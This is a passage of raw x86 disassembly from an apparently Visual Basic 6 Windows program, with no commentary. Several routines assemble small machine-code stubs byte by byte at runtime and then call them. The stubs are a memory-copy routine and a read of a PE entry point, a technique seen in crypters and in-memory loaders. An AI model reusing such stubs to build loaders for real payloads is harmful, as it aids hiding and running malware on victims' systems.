  404496:	88 41 0a             	mov    %al,0xa(%ecx)
  404499:	b9 0c 00 00 00       	mov    $0xc,%ecx
  40449e:	ff d6                	call   *%esi
  4044a0:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  4044a3:	b9 8b 00 00 00       	mov    $0x8b,%ecx
  4044a8:	88 42 0b             	mov    %al,0xb(%edx)
  4044ab:	ff d6                	call   *%esi
  4044ad:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  4044b0:	88 41 0c             	mov    %al,0xc(%ecx)
  4044b3:	b9 40 00 00 00       	mov    $0x40,%ecx
  4044b8:	ff d6                	call   *%esi
  4044ba:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  4044bd:	b9 28 00 00 00       	mov    $0x28,%ecx
  4044c2:	88 42 0d             	mov    %al,0xd(%edx)
  4044c5:	ff d6                	call   *%esi
  4044c7:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  4044ca:	88 41 0e             	mov    %al,0xe(%ecx)
  4044cd:	b9 c3 00 00 00       	mov    $0xc3,%ecx
  4044d2:	ff d6                	call   *%esi
  4044d4:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  4044d7:	33 c9                	xor    %ecx,%ecx
  4044d9:	88 42 0f             	mov    %al,0xf(%edx)
  4044dc:	ff d6                	call   *%esi
  4044de:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  4044e1:	57                   	push   %edi
  4044e2:	57                   	push   %edi
  4044e3:	57                   	push   %edi
  4044e4:	88 41 10             	mov    %al,0x10(%ecx)
  4044e7:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  4044ea:	57                   	push   %edi
  4044eb:	52                   	push   %edx
  4044ec:	e8 5b f9 ff ff       	call   0x403e4c
  4044f1:	8b 35 40 10 40 00    	mov    0x401040,%esi
  4044f7:	89 45 a4             	mov    %eax,-0x5c(%ebp)
  4044fa:	ff d6                	call   *%esi
  4044fc:	8b 5d a4             	mov    -0x5c(%ebp),%ebx
  4044ff:	6a 01                	push   $0x1
  404501:	8d 45 c0             	lea    -0x40(%ebp),%eax
  404504:	6a 01                	push   $0x1
  404506:	50                   	push   %eax
  404507:	e8 90 f9 ff ff       	call   0x403e9c
  40450c:	89 45 a4             	mov    %eax,-0x5c(%ebp)
  40450f:	ff d6                	call   *%esi
  404511:	6a 01                	push   $0x1
  404513:	53                   	push   %ebx
  404514:	8b 4d a4             	mov    -0x5c(%ebp),%ecx
  404517:	51                   	push   %ecx
  404518:	e8 33 01 00 00       	call   0x404650
  40451d:	8b 45 c0             	mov    -0x40(%ebp),%eax
  404520:	85 c0                	test   %eax,%eax
  404522:	74 2a                	je     0x40454e
  404524:	6a 01                	push   $0x1
  404526:	8d 55 c0             	lea    -0x40(%ebp),%edx
  404529:	83 c7 02             	add    $0x2,%edi
  40452c:	6a 01                	push   $0x1
  40452e:	52                   	push   %edx
  40452f:	0f 80 12 01 00 00    	jo     0x404647
  404535:	e8 62 f9 ff ff       	call   0x403e9c
  40453a:	89 45 a4             	mov    %eax,-0x5c(%ebp)
  40453d:	ff d6                	call   *%esi
  40453f:	8b c3                	mov    %ebx,%eax
  404541:	6a 01                	push   $0x1
  404543:	03 c7                	add    %edi,%eax
  404545:	0f 80 fc 00 00 00    	jo     0x404647
  40454b:	50                   	push   %eax
  40454c:	eb c6                	jmp    0x404514
  40454e:	6a 00                	push   $0x0
  404550:	57                   	push   %edi
  404551:	6a 01                	push   $0x1
  404553:	8d 55 e0             	lea    -0x20(%ebp),%edx
  404556:	6a 11                	push   $0x11
  404558:	52                   	push   %edx
  404559:	6a 01                	push   $0x1
  40455b:	68 80 00 00 00       	push   $0x80
  404560:	ff 15 b4 10 40 00    	call   *0x4010b4
  404566:	8b 45 e0             	mov    -0x20(%ebp),%eax
  404569:	83 c4 1c             	add    $0x1c,%esp
  40456c:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  40456f:	50                   	push   %eax
  404570:	51                   	push   %ecx
  404571:	ff 15 5c 11 40 00    	call   *0x40115c
  404577:	8b 4d b8             	mov    -0x48(%ebp),%ecx
  40457a:	85 c9                	test   %ecx,%ecx
  40457c:	74 23                	je     0x4045a1
  40457e:	66 83 39 01          	cmpw   $0x1,(%ecx)
  404582:	75 1d                	jne    0x4045a1
  404584:	8b 41 14             	mov    0x14(%ecx),%eax
  404587:	8b 51 10             	mov    0x10(%ecx),%edx
  40458a:	f7 d8                	neg    %eax
  40458c:	3b c2                	cmp    %edx,%eax
  40458e:	89 45 a0             	mov    %eax,-0x60(%ebp)
  404591:	72 17                	jb     0x4045aa
  404593:	ff 15 90 10 40 00    	call   *0x401090
  404599:	8b 4d b8             	mov    -0x48(%ebp),%ecx
  40459c:	8b 45 a0             	mov    -0x60(%ebp),%eax
  40459f:	eb 09                	jmp    0x4045aa
  4045a1:	ff 15 90 10 40 00    	call   *0x401090
  4045a7:	8b 4d b8             	mov    -0x48(%ebp),%ecx
  4045aa:	8b 51 0c             	mov    0xc(%ecx),%edx
  4045ad:	6a 01                	push   $0x1
  4045af:	03 d0                	add    %eax,%edx
  4045b1:	6a 01                	push   $0x1
  4045b3:	52                   	push   %edx
  4045b4:	e8 e3 f8 ff ff       	call   0x403e9c
  4045b9:	89 45 a4             	mov    %eax,-0x5c(%ebp)
  4045bc:	ff d6                	call   *%esi
  4045be:	8d 45 b8             	lea    -0x48(%ebp),%eax
  4045c1:	50                   	push   %eax
  4045c2:	ff 15 98 11 40 00    	call   *0x401198
  4045c8:	8b 4d a4             	mov    -0x5c(%ebp),%ecx
  4045cb:	57                   	push   %edi
  4045cc:	53                   	push   %ebx
  4045cd:	51                   	push   %ecx
  4045ce:	e8 7d 00 00 00       	call   0x404650
  4045d3:	8b 55 e0             	mov    -0x20(%ebp),%edx
  4045d6:	8d 45 a8             	lea    -0x58(%ebp),%eax
  4045d9:	50                   	push   %eax
  4045da:	89 55 b0             	mov    %edx,-0x50(%ebp)
  4045dd:	c7 45 a8 11 20 00 00 	movl   $0x2011,-0x58(%ebp)
  4045e4:	ff 15 88 11 40 00    	call   *0x401188
  4045ea:	8b d0                	mov    %eax,%edx
  4045ec:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  4045ef:	ff 15 84 11 40 00    	call   *0x401184
  4045f5:	68 33 46 40 00       	push   $0x404633
  4045fa:	eb 1a                	jmp    0x404616
  4045fc:	f6 45 fc 04          	testb  $0x4,-0x4(%ebp)
  404600:	74 09                	je     0x40460b
  404602:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  404605:	ff 15 a0 11 40 00    	call   *0x4011a0
  40460b:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  40460e:	51                   	push   %ecx
  40460f:	ff 15 98 11 40 00    	call   *0x401198
  404615:	c3                   	ret
  404616:	8b 35 50 10 40 00    	mov    0x401050,%esi
  40461c:	8d 55 e0             	lea    -0x20(%ebp),%edx
  40461f:	52                   	push   %edx
  404620:	6a 00                	push   $0x0
  404622:	ff d6                	call   *%esi
  404624:	8d 4d a4             	lea    -0x5c(%ebp),%ecx
  404627:	8d 45 c8             	lea    -0x38(%ebp),%eax
  40462a:	51                   	push   %ecx
  40462b:	6a 00                	push   $0x0
  40462d:	89 45 a4             	mov    %eax,-0x5c(%ebp)
  404630:	ff d6                	call   *%esi
  404632:	c3                   	ret
  404633:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  404636:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  404639:	5f                   	pop    %edi
  40463a:	5e                   	pop    %esi
  40463b:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404642:	5b                   	pop    %ebx
  404643:	8b e5                	mov    %ebp,%esp
  404645:	5d                   	pop    %ebp
  404646:	c3                   	ret
  404647:	ff 15 10 11 40 00    	call   *0x401110
  40464d:	90                   	nop
  40464e:	90                   	nop
  40464f:	90                   	nop
  404650:	55                   	push   %ebp
  404651:	8b ec                	mov    %esp,%ebp
  404653:	83 ec 08             	sub    $0x8,%esp
  404656:	68 66 12 40 00       	push   $0x401266
  40465b:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404661:	50                   	push   %eax
  404662:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  404669:	83 ec 28             	sub    $0x28,%esp
  40466c:	53                   	push   %ebx
  40466d:	56                   	push   %esi
  40466e:	57                   	push   %edi
  40466f:	89 65 f8             	mov    %esp,-0x8(%ebp)
  404672:	c7 45 fc d0 11 40 00 	movl   $0x4011d0,-0x4(%ebp)
  404679:	6a 11                	push   $0x11
  40467b:	8d 45 d8             	lea    -0x28(%ebp),%eax
  40467e:	68 bc 3e 40 00       	push   $0x403ebc
  404683:	50                   	push   %eax
  404684:	c7 45 d0 00 00 00 00 	movl   $0x0,-0x30(%ebp)
  40468b:	ff 15 98 10 40 00    	call   *0x401098
  404691:	8b 35 bc 10 40 00    	mov    0x4010bc,%esi
  404697:	b9 8b 00 00 00       	mov    $0x8b,%ecx
  40469c:	ff d6                	call   *%esi
  40469e:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  4046a1:	88 01                	mov    %al,(%ecx)
  4046a3:	b9 7c 00 00 00       	mov    $0x7c,%ecx
  4046a8:	ff d6                	call   *%esi
  4046aa:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  4046ad:	b9 24 00 00 00       	mov    $0x24,%ecx
  4046b2:	88 42 01             	mov    %al,0x1(%edx)
  4046b5:	ff d6                	call   *%esi
  4046b7:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  4046ba:	88 41 02             	mov    %al,0x2(%ecx)
  4046bd:	b9 04 00 00 00       	mov    $0x4,%ecx
  4046c2:	ff d6                	call   *%esi
  4046c4:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  4046c7:	b9 8b 00 00 00       	mov    $0x8b,%ecx
  4046cc:	88 42 03             	mov    %al,0x3(%edx)
  4046cf:	ff d6                	call   *%esi
  4046d1:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  4046d4:	88 41 04             	mov    %al,0x4(%ecx)
  4046d7:	b9 74 00 00 00       	mov    $0x74,%ecx
  4046dc:	ff d6                	call   *%esi
  4046de:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  4046e1:	b9 24 00 00 00       	mov    $0x24,%ecx
  4046e6:	88 42 05             	mov    %al,0x5(%edx)
  4046e9:	ff d6                	call   *%esi
  4046eb:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  4046ee:	88 41 06             	mov    %al,0x6(%ecx)
  4046f1:	b9 08 00 00 00       	mov    $0x8,%ecx
  4046f6:	ff d6                	call   *%esi
  4046f8:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  4046fb:	b9 8b 00 00 00       	mov    $0x8b,%ecx
  404700:	88 42 07             	mov    %al,0x7(%edx)
  404703:	ff d6                	call   *%esi
  404705:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  404708:	88 41 08             	mov    %al,0x8(%ecx)
  40470b:	b9 4c 00 00 00       	mov    $0x4c,%ecx
  404710:	ff d6                	call   *%esi
  404712:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  404715:	b9 24 00 00 00       	mov    $0x24,%ecx
  40471a:	88 42 09             	mov    %al,0x9(%edx)
  40471d:	ff d6                	call   *%esi
  40471f:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  404722:	88 41 0a             	mov    %al,0xa(%ecx)
  404725:	b9 0c 00 00 00       	mov    $0xc,%ecx
  40472a:	ff d6                	call   *%esi
  40472c:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  40472f:	b9 f3 00 00 00       	mov    $0xf3,%ecx
  404734:	88 42 0b             	mov    %al,0xb(%edx)
  404737:	ff d6                	call   *%esi
  404739:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  40473c:	88 41 0c             	mov    %al,0xc(%ecx)
  40473f:	b9 a4 00 00 00       	mov    $0xa4,%ecx
  404744:	ff d6                	call   *%esi
  404746:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  404749:	b9 c3 00 00 00       	mov    $0xc3,%ecx
  40474e:	88 42 0d             	mov    %al,0xd(%edx)
  404751:	ff d6                	call   *%esi
  404753:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  404756:	88 41 0e             	mov    %al,0xe(%ecx)
  404759:	33 c9                	xor    %ecx,%ecx
  40475b:	ff d6                	call   *%esi
  40475d:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  404760:	33 c9                	xor    %ecx,%ecx
  404762:	88 42 0f             	mov    %al,0xf(%edx)
  404765:	ff d6                	call   *%esi
  404767:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  40476a:	6a 00                	push   $0x0
  40476c:	88 41 10             	mov    %al,0x10(%ecx)
  40476f:	8b 55 10             	mov    0x10(%ebp),%edx
  404772:	8b 45 0c             	mov    0xc(%ebp),%eax
  404775:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404778:	52                   	push   %edx
  404779:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  40477c:	50                   	push   %eax
  40477d:	51                   	push   %ecx
  40477e:	52                   	push   %edx
  40477f:	e8 c8 f6 ff ff       	call   0x403e4c
  404784:	ff 15 40 10 40 00    	call   *0x401040
  40478a:	68 a2 47 40 00       	push   $0x4047a2
  40478f:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  404792:	8d 45 d8             	lea    -0x28(%ebp),%eax
  404795:	51                   	push   %ecx
  404796:	6a 00                	push   $0x0
  404798:	89 45 d0             	mov    %eax,-0x30(%ebp)
  40479b:	ff 15 50 10 40 00    	call   *0x401050
  4047a1:	c3                   	ret
  4047a2:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4047a5:	5f                   	pop    %edi
  4047a6:	5e                   	pop    %esi
  4047a7:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4047ae:	5b                   	pop    %ebx
  4047af:	8b e5                	mov    %ebp,%esp
  4047b1:	5d                   	pop    %ebp
  4047b2:	c2 0c 00             	ret    $0xc
  4047b5:	90                   	nop
  4047b6:	90                   	nop
  4047b7:	90                   	nop
  4047b8:	90                   	nop
  4047b9:	90                   	nop
  4047ba:	90                   	nop
  4047bb:	90                   	nop
  4047bc:	90                   	nop
  4047bd:	90                   	nop
  4047be:	90                   	nop
  4047bf:	90                   	nop
  4047c0:	55                   	push   %ebp
  4047c1:	8b ec                	mov    %esp,%ebp
  4047c3:	83 ec 18             	sub    $0x18,%esp
  4047c6:	68 66 12 40 00       	push   $0x401266
  4047cb:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4047d1:	50                   	push   %eax
  4047d2:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4047d9:	b8 6c 00 00 00       	mov    $0x6c,%eax
  4047de:	e8 7d ca ff ff       	call   0x401260
  4047e3:	53                   	push   %ebx
  4047e4:	56                   	push   %esi
  4047e5:	57                   	push   %edi
  4047e6:	89 65 e8             	mov    %esp,-0x18(%ebp)
  4047e9:	c7 45 ec e0 11 40 00 	movl   $0x4011e0,-0x14(%ebp)
  4047f0:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  4047f7:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  4047fe:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  404805:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  40480c:	6a ff                	push   $0xffffffff
  40480e:	ff 15 58 10 40 00    	call   *0x401058
  404814:	c7 45 fc 03 00 00 00 	movl   $0x3,-0x4(%ebp)
  40481b:	e8 a0 fb ff ff       	call   0x4043c0
  404820:	8b d0                	mov    %eax,%edx
  404822:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  404825:	ff 15 84 11 40 00    	call   *0x401184
  40482b:	50                   	push   %eax
  40482c:	6a 0e                	push   $0xe
  40482e:	6a ff                	push   $0xffffffff
  404830:	68 20 01 00 00       	push   $0x120
  404835:	ff 15 14 11 40 00    	call   *0x401114
  40483b:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40483e:	ff 15 a0 11 40 00    	call   *0x4011a0
  404844:	c7 45 fc 04 00 00 00 	movl   $0x4,-0x4(%ebp)
  40484b:	6a 0e                	push   $0xe
  40484d:	ff 15 18 11 40 00    	call   *0x401118
  404853:	50                   	push   %eax
  404854:	ff 15 80 10 40 00    	call   *0x401080
  40485a:	8b d0                	mov    %eax,%edx
  40485c:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40485f:	ff 15 84 11 40 00    	call   *0x401184
  404865:	c7 45 fc 05 00 00 00 	movl   $0x5,-0x4(%ebp)
  40486c:	6a 0e                	push   $0xe
  40486e:	8d 45 dc             	lea    -0x24(%ebp),%eax
  404871:	50                   	push   %eax
  404872:	6a 00                	push   $0x0
  404874:	ff 15 94 10 40 00    	call   *0x401094
  40487a:	c7 45 fc 06 00 00 00 	movl   $0x6,-0x4(%ebp)
  404881:	6a 0e                	push   $0xe
  404883:	ff 15 88 10 40 00    	call   *0x401088
  404889:	c7 45 fc 07 00 00 00 	movl   $0x7,-0x4(%ebp)
  404890:	68 a8 3f 40 00       	push   $0x403fa8
  404895:	ff 15 e4 10 40 00    	call   *0x4010e4
  40489b:	8b d0                	mov    %eax,%edx
  40489d:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  4048a0:	ff 15 84 11 40 00    	call   *0x401184
  4048a6:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  4048a9:	89 8d 7c ff ff ff    	mov    %ecx,-0x84(%ebp)
  4048af:	c7 45 d0 00 00 00 00 	movl   $0x0,-0x30(%ebp)
  4048b6:	8b 95 7c ff ff ff    	mov    -0x84(%ebp),%edx
  4048bc:	89 55 c8             	mov    %edx,-0x38(%ebp)
  4048bf:	c7 45 c0 08 00 00 00 	movl   $0x8,-0x40(%ebp)
  4048c6:	6a 00                	push   $0x0
  4048c8:	6a ff                	push   $0xffffffff
  4048ca:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4048cd:	50                   	push   %eax
  4048ce:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4048d1:	51                   	push   %ecx
  4048d2:	8d 55 b0             	lea    -0x50(%ebp),%edx
  4048d5:	52                   	push   %edx
  4048d6:	ff 15 d8 10 40 00    	call   *0x4010d8
  4048dc:	8d 45 b0             	lea    -0x50(%ebp),%eax
  4048df:	50                   	push   %eax
  4048e0:	68 08 20 00 00       	push   $0x2008
  4048e5:	ff 15 4c 10 40 00    	call   *0x40104c
  4048eb:	89 45 98             	mov    %eax,-0x68(%ebp)
  4048ee:	8d 4d 98             	lea    -0x68(%ebp),%ecx
  4048f1:	51                   	push   %ecx
  4048f2:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  4048f5:	52                   	push   %edx
  4048f6:	ff 15 80 11 40 00    	call   *0x401180
  4048fc:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  4048ff:	ff 15 a0 11 40 00    	call   *0x4011a0
  404905:	8d 45 b0             	lea    -0x50(%ebp),%eax
  404908:	50                   	push   %eax
  404909:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  40490c:	51                   	push   %ecx
  40490d:	6a 02                	push   $0x2
  40490f:	ff 15 28 10 40 00    	call   *0x401028
  404915:	83 c4 0c             	add    $0xc,%esp
  404918:	c7 45 fc 08 00 00 00 	movl   $0x8,-0x4(%ebp)
  40491f:	83 7d d4 00          	cmpl   $0x0,-0x2c(%ebp)
  404923:	74 48                	je     0x40496d
  404925:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  404928:	66 83 3a 01          	cmpw   $0x1,(%edx)
  40492c:	75 3f                	jne    0x40496d
  40492e:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  404931:	b9 01 00 00 00       	mov    $0x1,%ecx
  404936:	2b 48 14             	sub    0x14(%eax),%ecx
  404939:	89 4d 94             	mov    %ecx,-0x6c(%ebp)
  40493c:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  40493f:	8b 45 94             	mov    -0x6c(%ebp),%eax
  404942:	3b 42 10             	cmp    0x10(%edx),%eax
  404945:	73 0c                	jae    0x404953
  404947:	c7 85 78 ff ff ff 00 	movl   $0x0,-0x88(%ebp)
  40494e:	00 00 00 
  404951:	eb 0c                	jmp    0x40495f
  404953:	ff 15 90 10 40 00    	call   *0x401090
  404959:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
  40495f:	8b 4d 94             	mov    -0x6c(%ebp),%ecx
  404962:	c1 e1 02             	shl    $0x2,%ecx
  404965:	89 8d 74 ff ff ff    	mov    %ecx,-0x8c(%ebp)
  40496b:	eb 0c                	jmp    0x404979
  40496d:	ff 15 90 10 40 00    	call   *0x401090
  404973:	89 85 74 ff ff ff    	mov    %eax,-0x8c(%ebp)
  404979:	68 e4 3f 40 00       	push   $0x403fe4
  40497e:	ff 15 e4 10 40 00    	call   *0x4010e4
  404984:	8b d0                	mov    %eax,%edx
  404986:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  404989:	ff 15 84 11 40 00    	call   *0x401184
  40498f:	50                   	push   %eax
  404990:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  404993:	8b 42 0c             	mov    0xc(%edx),%eax
  404996:	8b 8d 74 ff ff ff    	mov    -0x8c(%ebp),%ecx
  40499c:	8b 14 08             	mov    (%eax,%ecx,1),%edx
  40499f:	52                   	push   %edx
  4049a0:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4049a3:	50                   	push   %eax
  4049a4:	e8 d7 00 00 00       	call   0x404a80
  4049a9:	6a 00                	push   $0x0
  4049ab:	68 80 00 00 00       	push   $0x80
  4049b0:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  4049b3:	51                   	push   %ecx
  4049b4:	8d 55 b0             	lea    -0x50(%ebp),%edx
  4049b7:	52                   	push   %edx
  4049b8:	ff 15 f8 10 40 00    	call   *0x4010f8
  4049be:	8d 45 b0             	lea    -0x50(%ebp),%eax
  4049c1:	50                   	push   %eax
  4049c2:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  4049c5:	51                   	push   %ecx
  4049c6:	ff 15 1c 11 40 00    	call   *0x40111c
  4049cc:	8d 55 ac             	lea    -0x54(%ebp),%edx
  4049cf:	52                   	push   %edx
  4049d0:	8d 45 d8             	lea    -0x28(%ebp),%eax
  4049d3:	50                   	push   %eax
  4049d4:	ff 15 18 10 40 00    	call   *0x401018
  4049da:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  4049dd:	ff 15 a0 11 40 00    	call   *0x4011a0
  4049e3:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  4049e6:	51                   	push   %ecx
  4049e7:	8d 55 c0             	lea    -0x40(%ebp),%edx
  4049ea:	52                   	push   %edx
  4049eb:	6a 02                	push   $0x2
  4049ed:	ff 15 28 10 40 00    	call   *0x401028
  4049f3:	83 c4 0c             	add    $0xc,%esp
  4049f6:	c7 45 fc 09 00 00 00 	movl   $0x9,-0x4(%ebp)
  4049fd:	6a 00                	push   $0x0
  4049ff:	6a 00                	push   $0x0
  404a01:	8d 45 d8             	lea    -0x28(%ebp),%eax
  404a04:	50                   	push   %eax
  404a05:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  404a08:	51                   	push   %ecx
  404a09:	e8 02 0d 00 00       	call   0x405710
  404a0e:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  404a11:	ff 15 1c 10 40 00    	call   *0x40101c
  404a17:	68 69 4a 40 00       	push   $0x404a69
  404a1c:	eb 29                	jmp    0x404a47
  404a1e:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  404a21:	ff 15 a0 11 40 00    	call   *0x4011a0
  404a27:	8d 55 b0             	lea    -0x50(%ebp),%edx
  404a2a:	52                   	push   %edx
  404a2b:	8d 45 c0             	lea    -0x40(%ebp),%eax
  404a2e:	50                   	push   %eax
  404a2f:	6a 02                	push   $0x2
  404a31:	ff 15 28 10 40 00    	call   *0x401028
  404a37:	83 c4 0c             	add    $0xc,%esp
  404a3a:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  404a3d:	51                   	push   %ecx
  404a3e:	6a 00                	push   $0x0
  404a40:	ff 15 50 10 40 00    	call   *0x401050
  404a46:	c3                   	ret
  404a47:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  404a4a:	ff 15 a0 11 40 00    	call   *0x4011a0
  404a50:	8d 55 d8             	lea    -0x28(%ebp),%edx
  404a53:	52                   	push   %edx
  404a54:	6a 00                	push   $0x0
  404a56:	ff 15 50 10 40 00    	call   *0x401050
  404a5c:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  404a5f:	50                   	push   %eax
  404a60:	6a 00                	push   $0x0
  404a62:	ff 15 50 10 40 00    	call   *0x401050
  404a68:	c3                   	ret
  404a69:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  404a6c:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404a73:	5f                   	pop    %edi
  404a74:	5e                   	pop    %esi
  404a75:	5b                   	pop    %ebx
  404a76:	8b e5                	mov    %ebp,%esp
  404a78:	5d                   	pop    %ebp
  404a79:	c3                   	ret
  404a7a:	cc                   	int3
  404a7b:	cc                   	int3
  404a7c:	cc                   	int3
  404a7d:	cc                   	int3
  404a7e:	cc                   	int3
  404a7f:	cc                   	int3
  404a80:	55                   	push   %ebp
  404a81:	8b ec                	mov    %esp,%ebp
  404a83:	83 ec 0c             	sub    $0xc,%esp
  404a86:	68 66 12 40 00       	push   $0x401266
  404a8b:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404a91:	50                   	push   %eax
  404a92:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  404a99:	83 ec 48             	sub    $0x48,%esp
  404a9c:	53                   	push   %ebx
  404a9d:	56                   	push   %esi
  404a9e:	57                   	push   %edi
  404a9f:	89 65 f4             	mov    %esp,-0xc(%ebp)
  404aa2:	c7 45 f8 28 12 40 00 	movl   $0x401228,-0x8(%ebp)
  404aa9:	8b 55 0c             	mov    0xc(%ebp),%edx
  404aac:	8b 3d 30 11 40 00    	mov    0x401130,%edi
  404ab2:	33 f6                	xor    %esi,%esi
  404ab4:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  404ab7:	89 75 e8             	mov    %esi,-0x18(%ebp)
  404aba:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  404abd:	89 75 e0             	mov    %esi,-0x20(%ebp)
  404ac0:	89 75 d0             	mov    %esi,-0x30(%ebp)
  404ac3:	89 75 c0             	mov    %esi,-0x40(%ebp)
  404ac6:	89 75 bc             	mov    %esi,-0x44(%ebp)
  404ac9:	89 75 ac             	mov    %esi,-0x54(%ebp)
  404acc:	ff d7                	call   *%edi
  404ace:	8b 55 10             	mov    0x10(%ebp),%edx
  404ad1:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  404ad4:	ff d7                	call   *%edi
  404ad6:	8b 45 e0             	mov    -0x20(%ebp),%eax
  404ad9:	8b 3d 24 10 40 00    	mov    0x401024,%edi
  404adf:	50                   	push   %eax
  404ae0:	ff d7                	call   *%edi
  404ae2:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  404ae5:	8b d8                	mov    %eax,%ebx
  404ae7:	f7 db                	neg    %ebx
  404ae9:	1b db                	sbb    %ebx,%ebx
  404aeb:	51                   	push   %ecx
  404aec:	f7 db                	neg    %ebx
  404aee:	ff d7                	call   *%edi
  404af0:	f7 d8                	neg    %eax
  404af2:	1b c0                	sbb    %eax,%eax
  404af4:	f7 d8                	neg    %eax
  404af6:	85 d8                	test   %ebx,%eax
  404af8:	74 7b                	je     0x404b75
  404afa:	8b 3d f8 10 40 00    	mov    0x4010f8,%edi
  404b00:	56                   	push   %esi
  404b01:	8d 45 ac             	lea    -0x54(%ebp),%eax
  404b04:	68 80 00 00 00       	push   $0x80
  404b09:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  404b0c:	8d 55 e0             	lea    -0x20(%ebp),%edx
  404b0f:	50                   	push   %eax
  404b10:	51                   	push   %ecx
  404b11:	89 55 b4             	mov    %edx,-0x4c(%ebp)
  404b14:	c7 45 ac 08 40 00 00 	movl   $0x4008,-0x54(%ebp)
  404b1b:	ff d7                	call   *%edi
  404b1d:	8d 55 c0             	lea    -0x40(%ebp),%edx
  404b20:	8d 45 bc             	lea    -0x44(%ebp),%eax
  404b23:	52                   	push   %edx
  404b24:	50                   	push   %eax
  404b25:	ff 15 1c 11 40 00    	call   *0x40111c
  404b2b:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  404b2e:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  404b31:	51                   	push   %ecx
  404b32:	52                   	push   %edx
  404b33:	ff 15 18 10 40 00    	call   *0x401018
  404b39:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  404b3c:	ff 15 1c 10 40 00    	call   *0x40101c
  404b42:	8b 45 e8             	mov    -0x18(%ebp),%eax
  404b45:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  404b48:	50                   	push   %eax
  404b49:	51                   	push   %ecx
  404b4a:	e8 a1 00 00 00       	call   0x404bf0
  404b4f:	56                   	push   %esi
  404b50:	8d 45 ac             	lea    -0x54(%ebp),%eax
  404b53:	6a 40                	push   $0x40
  404b55:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  404b58:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  404b5b:	50                   	push   %eax
  404b5c:	51                   	push   %ecx
  404b5d:	89 55 b4             	mov    %edx,-0x4c(%ebp)
  404b60:	c7 45 ac 11 60 00 00 	movl   $0x6011,-0x54(%ebp)
  404b67:	ff d7                	call   *%edi
  404b69:	8d 55 c0             	lea    -0x40(%ebp),%edx
